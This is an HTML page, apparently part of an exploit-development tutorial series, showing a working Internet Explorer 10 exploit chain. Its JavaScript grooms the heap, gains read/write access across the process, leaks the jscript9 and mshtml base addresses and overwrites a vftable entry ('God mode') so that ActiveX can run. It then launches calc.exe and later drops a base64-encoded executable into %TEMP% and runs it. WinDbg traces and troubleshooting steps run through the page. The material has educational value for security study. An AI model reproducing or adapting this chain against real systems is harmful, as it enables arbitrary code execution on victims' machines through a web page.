+    }  
+    
+    buf_addr = nextPtr1 - 0x60*2;
+    
+    // Now we modify int32array again to gain full address space read/write access.
+    if (int32array[(0x0c0af000+0x1c - buf_addr)/4] != buf_addr) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    int32array[(0x0c0af000+0x18 - buf_addr)/4] = 0x20000000;        // new length
+    int32array[(0x0c0af000+0x1c - buf_addr)/4] = 0;                 // new buffer address
+ 
+    function read(address) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        return int32array[address/4];
+      }
+      else {
+        alert("to debug");
+        // .### #... or ..## ##.. or ...# ###.
+        return (int32array[(address-k)/4] &gt;&gt; k*8) |
+               (int32array[(address-k+4)/4] &lt;&lt; (32 - k*8));
+      }
+    }
+    
+    function write(address, value) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        int32array[address/4] = value;
+      }
+      else {
+        // .### #... or ..## ##.. or ...# ###.
+        alert("to debug");
+        var low = int32array[(address-k)/4];
+        var high = int32array[(address-k+4)/4];
+        var mask = (1 &lt;&lt; k*8) - 1;  // 0xff or 0xffff or 0xffffff
+        low = (low &amp; mask) | (value &lt;&lt; k*8);
+        high = (high &amp; (0xffffffff - mask)) | (value &gt;&gt; (32 - k*8));
+        int32array[(address-k)/4] = low;
+        int32array[(address-k+4)/4] = high;
+      }
+    }
+    
+    //---------
+    // God mode
+    //---------
+    
+    // At 0c0af000 we can read the vfptr of an Int32Array:
+    //   jscript9!Js::TypedArray&lt;int&gt;::`vftable' @ jscript9+3b60
+    jscript9 = read(0x0c0af000) - 0x3b60;
+    
+    // Now we need to determine the base address of MSHTML. We can create an HTML
+    // object and write its reference to the address 0x0c0af000-4 which corresponds
+    // to the last element of one of our arrays.
+    // Let's find the array at 0x0c0af000-4.
+    
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i)
+      a[i][0x3bf7] = 0;
+    
+    // We write 3 in the last position of one of our arrays. IE encodes the number x
+    // as 2*x+1 so that it can tell addresses (dword aligned) and numbers apart.
+    // Either we use an odd number or a valid address otherwise IE will crash in the
+    // following for loop.
+    write(0x0c0af000-4, 3);
+ 
+    leakArray = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      if (a[i][0x3bf7] != 0) {
+        leakArray = a[i];
+        break;
+      }
+    }
+    if (leakArray == 0) {
+      alert("Can't find leakArray!");
+      window.location.reload();
+      return;
+    }
+    
+    function get_addr(obj) {
+      leakArray[0x3bf7] = obj;
+      return read(0x0c0af000-4, obj);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable'
+    //      v
+    //   70792248 0c012b40 00000000 00000003
+    //   73b38b9a 00000000 00574230 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x58b9a
+    var addr = get_addr(document.createElement("div"));
+    mshtml = read(addr + 0x10) - 0x58b9a;
+
+    // We want to overwrite mshtml+0xc555e0+0x14 with jscript9+0xdc164 where:
+    //   * mshtml+0xc555e0 is the address of the vftable we want to modify;
+    //   * jscript9+0xdc164 points to the code "leave / ret 4".
+    // As a result, jscript9!ScriptEngine::CanObjectRun returns true.
+
+    var old = read(mshtml+0xc555e0+0x14);
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+    
+    shell = new ActiveXObject("WScript.shell");
+    shell.Exec('calc.exe');
+
+    write(mshtml+0xc555e0+0x14, old);      // God mode off!
+    
+    alert("All done!");
+  })();
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Open it in IE and, when the alert box tells you, go in WinDbg and set the byte at <span style="color: #00ff00;">0c0af01b</span> to <span style="color: #00ff00;">0x20</span> or the dword at <span style="color: #00ff00;">0c0af018</span> to <span style="color: #00ff00;">0x20000000</span>. Then close the alert box and the calculator should pop up. If there is an error (it may happen, as we already saw), don’t worry and repeat the process.</p><h2>Running arbitrary code</h2><p>We saw how to run an executable present on the victim’s computer. Now let’s see how we can execute arbitrary code. The trick is to create an .exe file and then execute it. This is the code to do just that:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  // content of exe file encoded in base64.
+  runcalc = ... put base64 encoded exe here ...
+
+  function createExe(fname, data) {
+    var tStream = new ActiveXObject("ADODB.Stream");
+    var bStream = new ActiveXObject("ADODB.Stream");
+    
+    tStream.Type = 2;       // text
+    bStream.Type = 1;       // binary
+    tStream.Open();
+    bStream.Open();
+    tStream.WriteText(data);
+    tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+    tStream.CopyTo(bStream);
+    bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+    tStream.Close();
+    bStream.Close();
+  }
+ 
+  function decode(b64Data) {
+    var data = window.atob(b64Data);
+    
+    // Now data is like
+    //   11 00 12 00 45 00 50 00 ...
+    // rather than like
+    //   11 12 45 50 ...
+    // Let's fix this!
+    var arr = new Array();
+    for (var i = 0; i &lt; data.length / 2; ++i) {
+      var low = data.charCodeAt(i*2);
+      var high = data.charCodeAt(i*2 + 1);
+      arr.push(String.fromCharCode(low + high * 0x100));
+    }
+    return arr.join('');
+  }
+
+  shell = new ActiveXObject("WScript.shell");
+  fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+  createExe(fname, decode(runcalc));
+  shell.Exec(fname);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I won’t explain the details of how this code works because I don’t think that’s very interesting.</p><p>First of all, let’s create a little application which open the calculator. In real life, we’d code something more interesting and useful, of course, but that’s enough for a demonstration.</p><p>Create a <span style="color: #00ccff;">C/C++</span> <span style="color: #00ff00;">Win32 Project</span> in <span style="color: #00ccff;">Visual Studio 2013</span> with the following code:</p>
+
+<pre><code class="language-cpp">#include "windows.h"
+
+int CALLBACK WinMain(
+    _In_  HINSTANCE hInstance,
+    _In_  HINSTANCE hPrevInstance,
+    _In_  LPSTR lpCmdLine,
+    _In_  int nCmdShow) {
+    WinExec("calc.exe", SW_SHOW);
+    return 0;
+}
+</code></pre>
+
+<p>Change the project properties as follows:</p><ul><li>[<span style="color: #00ff00;">Release</span>]<ul><li>Configuration Properties<ul><li>C/C++<ul><li>Code Generation<ul><li><span style="color: #00ff00;">Runtime Library</span>: Multi-threaded (/MT)</li></ul></li></ul></li></ul></li></ul></li></ul><p>This will make sure that the runtime library is statically linked (we want the exe file to be <em>standalone</em>). Build the <span style="color: #00ff00;">Release</span> version and you should have a <span style="color: #00ff00;">68-KB</span> file. Mine is named <span style="color: #00ff00;">runcalc.exe</span>.</p><p>Now encode <span style="color: #00ff00;">runcalc.exe</span> in <span style="color: #00ccff;">base64</span> with a little <span style="color: #00ccff;">Python</span> script:</p>
+
+<pre><code class="language-python">import base64
+
+with open(r'c:\runcalc.exe', 'rb') as f:
+  print(base64.b64encode(f.read()))
+</code></pre>
+  
+  <p>Now copy and paste the encoded data into the javascript code above so that you have</p>
+  
+<pre><code class="language-js">runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAA';
+</code></pre>
+  
+  <p>I snipped the string because too long, but you can download it here: <a href="code/runcalc.zip">runcalc</a>.</p><p>Open the html file in IE and you’ll see that the calculator doesn’t pop up. To see what’s wrong, open the <span style="color: #00ccff;">Developer Tools</span> (<span style="color: #00ff00;">F12</span>), go to the <span style="color: #00ff00;">Console tab</span> and then reload the page. Here’s what we get:</p><p>
+<a href="images/pic_30.png"><img src="images/pic_30.png" alt="pic_30" width="1136" height="723"></a>
+  <br> The problem is that Microsoft decided to disable <span style="color: #00ff00;">ADODB.Stream</span> in Internet Explorer because <span style="color: #00ff00;">ADODB.Stream</span> is intrinsically unsafe. For now, let’s reenable it by using a little utility called <span style="color: #00ccff;">acm </span>(<a href="http://www.nirsoft.net/utils/acm.html">download</a>).</p><p>Install acm, run it and enable <span style="color: #00ff00;">ADODB.Stream</span> like shown in the following picture:</p><p>
+<a href="images/pic_31.png"><img src="images/pic_31.png" alt="pic_31" width="1604" height="612"></a>
+  <br> Now restart IE and open the html file again. This time the calculator will pop up!</p><p>The problems are not over, unfortunately.</p><p>Download an utility called <span style="color: #00ccff;">SimpleServer:WWW</span> from here: <a href="http://www.analogx.com/contents/download/Network/sswww/Freeware.htm">link</a>.</p><p>We’re going to use it to run the html file as if it were served by a<span style="color: #00ccff;"> web server</span>. SimpleServer is easy to configure. Just create a folder called <span style="color: #00ff00;">WebDir</span> on the Desktop, copy the html file into that folder, then run SimpleServer and select the html file like indicated in the following picture:</p><p>
+<a href="images/pic_32.png"><img src="images/pic_32.png" alt="pic_32" width="605" height="409"></a>
+  <br> Then click on Start. Now open IE and open the page at the address <span style="color: #00ff00;">127.0.0.1</span>. The calculator won’t pop up. Once again, use the Developer Tools to see what’s wrong:</p><p>
+<a href="images/pic_33.png"><img src="images/pic_33.png" alt="pic_33" width="1136" height="723"></a>
+  <br> It seems that things work differently when we receive a page from a server.</p><p>Change the settings as shown in the following picture:</p><p>
+<a href="images/pic_34.png"><img src="images/pic_34.png" alt="pic_34" width="1136" height="723"></a>
+  <br> Reload the page and you should see another error:</p><p>
+<a href="images/pic_35.png"><img src="images/pic_35.png" alt="pic_35" width="1569" height="723"></a>
+  <br> OK, now is time to solve all these problems. Reset all the settings in IE and disable again <span style="color: #00ff00;">ADODB.Stream</span> with the utility acm. Here’s the full code we’re going to work on:</p>
+  
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function() {
+    alert("Starting!");
+
+    //-----------------------------------------------------
+    // From one-byte-write to full process space read/write
+    //-----------------------------------------------------
+ 
+    a = new Array();
+ 
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte ArrayBuffer (buf)
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    for (i = 0; i &lt; 0x200; ++i) {
+      a[i] = new Array(0x3c00);
+      if (i == 0x80)
+        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
+      for (j = 0; j &lt; a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+    
+    //    0x0:  ArrayDataHead
+    //   0x20:  array[0] address
+    //   0x24:  array[1] address
+    //   ...
+    // 0xf000:  Int32Array
+    // 0xf030:  Int32Array
+    //   ...
+    // 0xffc0:  Int32Array
+    // 0xfff0:  align data
+    for (; i &lt; 0x200 + 0x400; ++i) {
+      a[i] = new Array(0x3bf8)
+      for (j = 0; j &lt; 0x55; ++j)
+        a[i][j] = new Int32Array(buf)
+    }
+    
+    //            vftptr
+    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
+    // 0c0af020: 03133de0                                             array_len buf_addr
+    //          jsArrayBuf
+    alert("Set byte at 0c0af01b to 0x20");
+    
+    // Now let's find the Int32Array whose length we modified.
+    int32array = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      for (j = 0; j &lt; 0x55; ++j) {
+        if (a[i][j].length != 0x58/4) {
+          int32array = a[i][j];
+          break;
+        }
+      }
+      if (int32array != 0)
+        break;
+    }
+    
+    if (int32array == 0) {
+      alert("Can't find int32array!");
+      window.location.reload();
+      return;
+    }
+ 
+    // This is just an example.
+    // The buffer of int32array starts at 03c1f178 and is 0x58 bytes.
+    // The next LargeHeapBlock, preceded by 8 bytes of header, starts at 03c1f1d8.
+    // The value in parentheses, at 03c1f178+0x60+0x24, points to the following
+    // LargeHeapBlock.
+    //
+    // 03c1f178: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f198: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f1b8: 00000000 00000000 00000000 00000000 00000000 00000000 014829e8 8c000000
+    // 03c1f1d8: 70796e18 00000003 08100000 00000010 00000001 00000000 00000004 0810f020
+    // 03c1f1f8: 08110000(03c1f238)00000000 00000001 00000001 00000000 03c15b40 08100000
+    // 03c1f218: 00000000 00000000 00000000 00000004 00000001 00000000 01482994 8c000000
+    // 03c1f238: ...
+
+    // We check that the structure above is correct (we check the first LargeHeapBlocks).
+    // 70796e18 = jscript9!LargeHeapBlock::`vftable' = jscript9 + 0x6e18
+    var vftptr1 = int32array[0x60/4],
+        vftptr2 = int32array[0x60*2/4],
+        vftptr3 = int32array[0x60*3/4],
+        nextPtr1 = int32array[(0x60+0x24)/4],
+        nextPtr2 = int32array[(0x60*2+0x24)/4],
+        nextPtr3 = int32array[(0x60*3+0x24)/4];
+    if (vftptr1 &amp; 0xffff != 0x6e18 || vftptr1 != vftptr2 || vftptr2 != vftptr3 ||
+        nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    
+    buf_addr = nextPtr1 - 0x60*2;
+    
+    // Now we modify int32array again to gain full address space read/write access.
+    if (int32array[(0x0c0af000+0x1c - buf_addr)/4] != buf_addr) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    int32array[(0x0c0af000+0x18 - buf_addr)/4] = 0x20000000;        // new length
+    int32array[(0x0c0af000+0x1c - buf_addr)/4] = 0;                 // new buffer address
+ 
+    function read(address) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        return int32array[address/4];
+      }
+      else {
+        alert("to debug");
+        // .### #... or ..## ##.. or ...# ###.
+        return (int32array[(address-k)/4] &gt;&gt; k*8) |
+               (int32array[(address-k+4)/4] &lt;&lt; (32 - k*8));
+      }
+    }
+    
+    function write(address, value) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        int32array[address/4] = value;
+      }
+      else {
+        // .### #... or ..## ##.. or ...# ###.
+        alert("to debug");
+        var low = int32array[(address-k)/4];
+        var high = int32array[(address-k+4)/4];
+        var mask = (1 &lt;&lt; k*8) - 1;  // 0xff or 0xffff or 0xffffff
+        low = (low &amp; mask) | (value &lt;&lt; k*8);
+        high = (high &amp; (0xffffffff - mask)) | (value &gt;&gt; (32 - k*8));
+        int32array[(address-k)/4] = low;
+        int32array[(address-k+4)/4] = high;
+      }
+    }
+    
+    //---------
+    // God mode
+    //---------
+    
+    // At 0c0af000 we can read the vfptr of an Int32Array:
+    //   jscript9!Js::TypedArray&lt;int&gt;::`vftable' @ jscript9+3b60
+    jscript9 = read(0x0c0af000) - 0x3b60;
+    
+    // Now we need to determine the base address of MSHTML. We can create an HTML
+    // object and write its reference to the address 0x0c0af000-4 which corresponds
+    // to the last element of one of our arrays.
+    // Let's find the array at 0x0c0af000-4.
+    
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i)
+      a[i][0x3bf7] = 0;
+    
+    // We write 3 in the last position of one of our arrays. IE encodes the number x
+    // as 2*x+1 so that it can tell addresses (dword aligned) and numbers apart.
+    // Either we use an odd number or a valid address otherwise IE will crash in the
+    // following for loop.
+    write(0x0c0af000-4, 3);
+ 
+    leakArray = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      if (a[i][0x3bf7] != 0) {
+        leakArray = a[i];
+        break;
+      }
+    }
+    if (leakArray == 0) {
+      alert("Can't find leakArray!");
+      window.location.reload();
+      return;
+    }
+    
+    function get_addr(obj) {
+      leakArray[0x3bf7] = obj;
+      return read(0x0c0af000-4, obj);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable'
+    //      v
+    //   70792248 0c012b40 00000000 00000003
+    //   73b38b9a 00000000 00574230 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x58b9a
+    var addr = get_addr(document.createElement("div"));
+    mshtml = read(addr + 0x10) - 0x58b9a;
+
+    // We want to overwrite mshtml+0xc555e0+0x14 with jscript9+0xdc164 where:
+    //   * mshtml+0xc555e0 is the address of the vftable we want to modify;
+    //   * jscript9+0xdc164 points to the code "leave / ret 4".
+    // As a result, jscript9!ScriptEngine::CanObjectRun returns true.
+
+    var old = read(mshtml+0xc555e0+0x14);
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+    
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+      tStream.Close();
+      bStream.Close();
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+      // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+ 
+    shell = new ActiveXObject("WScript.shell");
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    createExe(fname, decode(runcalc));
+    shell.Exec(fname);
+ 
+    write(mshtml+0xc555e0+0x14, old);      // God mode off!
+    
+    alert("All done!");
+  })();
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I snipped the value of <span style="color: #00ff00;">runcalc</span> because it was too long. You can download the full code from here: <a href="code/code1.zip">code1</a>.</p><p>Use SimpleServer to serve this code. Go to <span style="color: #00ff00;">127.0.0.1</span> in IE and when the dialog box pops up do what it says in WinDbg. Unfortunately, IE crashes here:</p><pre class="ignore:true">6ef82798 90              nop
+IEFRAME!CDocObjectHost::_ScriptErr_Dlg:
+6ef82799 8bff            mov     edi,edi
+6ef8279b 55              push    ebp
+6ef8279c 8bec            mov     ebp,esp
+6ef8279e b870100000      mov     eax,1070h
+6ef827a3 e86ee8f0ff      call    IEFRAME!_alloca_probe (6ee91016)
+6ef827a8 a1b874376f      mov     eax,dword ptr [IEFRAME!__security_cookie (6f3774b8)]
+6ef827ad 33c5            xor     eax,ebp
+6ef827af 8945fc          mov     dword ptr [ebp-4],eax
+6ef827b2 53              push    ebx
+6ef827b3 33db            xor     ebx,ebx
+6ef827b5 57              push    edi
+6ef827b6 8bf9            mov     edi,ecx
+6ef827b8 399e78050000    cmp     dword ptr [esi+578h],ebx ds:002b:00000578=????????   &lt;--------------------
+6ef827be 0f84b8890c00    je      IEFRAME!CDocObjectHost::_ScriptErr_Dlg+0x3d (6f04b17c)
+6ef827c4 e99d890c00      jmp     IEFRAME!CDocObjectHost::_ScriptErr_Dlg+0x27 (6f04b166)
+6ef827c9 90              nop
+6ef827ca 90              nop
+6ef827cb 90              nop
+6ef827cc 90              nop
+6ef827cd 90              nop
+IEFRAME!CDocObjectHost::_ScriptErr_CacheInfo:
+6ef827ce 8bff            mov     edi,edi
+6ef827d0 55              push    ebp
+6ef827d1 8bec            mov     ebp,esp
+6ef827d3 81eca8000000    sub     esp,0A8h
+6ef827d9 a1b874376f      mov     eax,dword ptr [IEFRAME!__security_cookie (6f3774b8)]
+6ef827de 33c5            xor     eax,ebp</pre><p>This might be a problem with our<em> God Mode</em>. Let’s find out by modifying our javascript code as follows:</p>
+
+<pre><code class="language-js">    var old = read(mshtml+0xc555e0+0x14);
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+    alert("bp on " + (mshtml+0xc555e0+0x14).toString(16));
+</code></pre>
+    
+    <p>We just add an alert right after the activation of the <em>God Mode</em>. Restart IE and WinDbg and repeat the whole process.</p><p>I must admit that I get the <span style="color: #00ff00;">Error</span> message box a lot. Let’s change some values and see if things get better. Here are the changes:</p>
+    
+<pre><code class="language-js">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function() {
+    alert("Starting!");
+
+    //-----------------------------------------------------
+    // From one-byte-write to full process space read/write
+    //-----------------------------------------------------
+ 
+    a = new Array();
+ 
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte ArrayBuffer (buf)
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    for (i = 0; i &lt; 0x300; ++i) {           // &lt;------------ from 0x200 to 0x300
+      a[i] = new Array(0x3c00);
+      if (i == 0x100)                       // &lt;------------ from 0x80 to 0x100
+        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
+      for (j = 0; j &lt; a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+    
+    //    0x0:  ArrayDataHead
+    //   0x20:  array[0] address
+    //   0x24:  array[1] address
+    //   ...
+    // 0xf000:  Int32Array
+    // 0xf030:  Int32Array
+    //   ...
+    // 0xffc0:  Int32Array
+    // 0xfff0:  align data
+    for (; i &lt; 0x300 + 0x400; ++i) {        // &lt;------------ from 0x200 to 0x300
+      a[i] = new Array(0x3bf8)
+      for (j = 0; j &lt; 0x55; ++j)
+        a[i][j] = new Int32Array(buf)
+    }
+    
+    //            vftptr
+    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
+    // 0c0af020: 03133de0                                             array_len buf_addr
+    //          jsArrayBuf
+    alert("Set byte at 0c0af01b to 0x20");
+    
+    // Now let's find the Int32Array whose length we modified.
+    int32array = 0;
+    for (i = 0x300; i &lt; 0x300 + 0x400; ++i) {       // &lt;------------ from 0x200 to 0x300
+      for (j = 0; j &lt; 0x55; ++j) {
+        if (a[i][j].length != 0x58/4) {
+          int32array = a[i][j];
+          break;
+        }
+      }
+      if (int32array != 0)
+        break;
+    }
+</code></pre>
+    
+    <p>Ah, much better! Now it’s way more stable, at least on my system.</p><p>Finally, the dialog box with the address of the modified entry in the vftable pops up. In my case, it says <span style="color: #00ff00;">bp on 6d0f55f4</span>. Let’s put a breakpoint on access:</p><pre class="ignore:true">ba r4 mshtml+0xc555e0+0x14</pre><p>After we hit <span style="color: #00ff00;">F5</span> and we close the dialog, the execution stops here:</p><pre class="ignore:true">0555c15a 5f              pop     edi
+0555c15b 5e              pop     esi
+0555c15c 33cd            xor     ecx,ebp
+0555c15e 5b              pop     ebx
+0555c15f e8da51f2ff      call    jscript9!__security_check_cookie (0548133e)
+0555c164 c9              leave         &lt;-------------------- we are here
+0555c165 c20400          ret     4</pre><p>Here’s the stack trace:</p><pre class="ignore:true">0:007&gt; k 5
+ChildEBP RetAddr  
+03e0bbb4 0555bfae jscript9!ScriptEngine::CanObjectRun+0xaf
+03e0bc00 0555bde1 jscript9!ScriptSite::CreateObjectFromProgID+0xdf
+03e0bc44 0555bd69 jscript9!ScriptSite::CreateActiveXObject+0x56
+03e0bc78 054c25d5 jscript9!JavascriptActiveXObject::NewInstance+0x90
+03e0bcd0 054ccd4a jscript9!Js::InterpreterStackFrame::NewScObject_Helper+0xd6</pre><p>OK, we’re inside <span style="color: #00ff00;">CreateActiveXObject</span> so everything is proceeding as it should. Let’s hit <span style="color: #00ff00;">F5</span> again. Now the execution stops on the same instruction but the stack trace is different:</p><pre class="ignore:true">0:007&gt; k 10
+ChildEBP RetAddr  
+03e0a4dc 6eeb37aa jscript9!ScriptEngine::CanObjectRun+0xaf
+03e0b778 6eedac3e IEFRAME!CDocObjectHost::OnExec+0xf9d
+03e0b7a8 6c9d7e9a IEFRAME!CDocObjectHost::Exec+0x23d
+03e0b810 6c9d7cc7 MSHTML!CWindow::ShowErrorDialog+0x95
+03e0b954 6c9d7b68 MSHTML!COmWindowProxy::Fire_onerror+0xc6
+03e0bbc0 6c9d7979 MSHTML!CMarkup::ReportScriptError+0x179
+03e0bc40 0555dbe4 MSHTML!CActiveScriptHolder::OnScriptError+0x14e
+03e0bc50 0555e516 jscript9!ScriptEngine::OnScriptError+0x17
+03e0bc6c 0555e4b6 jscript9!ScriptSite::ReportError+0x56
+03e0bc78 0555e460 jscript9!ScriptSite::HandleJavascriptException+0x1b
+03e0c3d8 05492027 jscript9!ScriptSite::CallRootFunction+0x6d
+03e0c400 0553df75 jscript9!ScriptSite::Execute+0x61
+03e0c48c 0553db57 jscript9!ScriptEngine::ExecutePendingScripts+0x1e9
+03e0c514 0553e0b7 jscript9!ScriptEngine::ParseScriptTextCore+0x2ad
+03e0c568 6c74b60c jscript9!ScriptEngine::ParseScriptText+0x5b
+03e0c5a0 6c74945d MSHTML!CActiveScriptHolder::ParseScriptText+0x42</pre><p>After a little bit of stepping IE crashes as before. It seems we have a problem with our <em>God Mode</em>. Probably, our problem is that we modified the vftable itself which is used by all the objects of the same type. We should create a modified copy of the original vftable and make the object we’re interested in point to it.</p><p style="text-align: center; font-size: 40px;">← <a href="ie-10-from-one-byte-write-to-full-process-space-readwrite.html">Prev Part</a> | <a href="ie10-god-mode-2.html">Next Part</a> →</p> </div></div>
+
+</body>
+</html>
